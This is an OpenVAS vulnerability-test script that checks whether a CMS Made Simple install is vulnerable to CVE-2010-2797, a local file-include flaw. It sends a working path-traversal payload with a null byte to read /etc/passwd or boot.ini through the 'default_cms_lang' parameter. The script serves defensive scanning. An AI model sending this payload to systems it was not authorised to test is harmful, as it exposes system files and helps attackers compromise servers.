###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_cms_made_simple_41565.nasl 14 2013-10-27 12:33:37Z jan $
#
# CMS Made Simple 'default_cms_lang' Parameter Local File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "CMS Made Simple is prone to a local file-include vulnerability because
it fails to properly sanitize user-supplied input.

An attacker can exploit this vulnerability to obtain potentially
sensitive information and execute arbitrary local scripts in the
context of the webserver process. This may allow the attacker to
compromise the application and the underlying computer; other attacks
are also possible.";


if (description)
{
 script_id(100716);
 script_version("$Revision: 14 $");
 script_cve_id("CVE-2010-2797");
 script_bugtraq_id(41565);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-07-14 13:50:55 +0200 (Wed, 14 Jul 2010)");
 script_name("CMS Made Simple 'default_cms_lang' Parameter Local File Include Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/41565");
 script_xref(name : "URL" , value : "http://www.cmsmadesimple.org/");

 script_description(desc);
 script_summary("Determine if CMS Made Simple is prone to a local file-include vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("cms_made_simple_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if(!dir = get_dir_from_kb(port:port,app:"cms_made_simple"))exit(0);
files = make_array("root:.*:0:[01]:","etc/passwd","\[boot loader\]","boot.ini");

filename = string(dir,"/admin/addbookmark.php");
host = get_host_name();

foreach file (keys(files)) {

  ex = string("default_cms_lang=",crap(data:"..%2f",length:"50"),files[file],"%00");

  req = string("POST ", filename, " HTTP/1.1\r\n", 
  	       "Host: ", host, ":", port, "\r\n",
	       "Accept-Encoding: identity\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n", 
	       "Content-Length: ", strlen(ex), 
	       "\r\n\r\n", 
	       ex);

  result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if(result == NULL)continue;

  if(egrep(pattern:file, string:result, icase: TRUE)) {
    security_hole(port:port);
    exit(0);
  }  

}
exit(0);
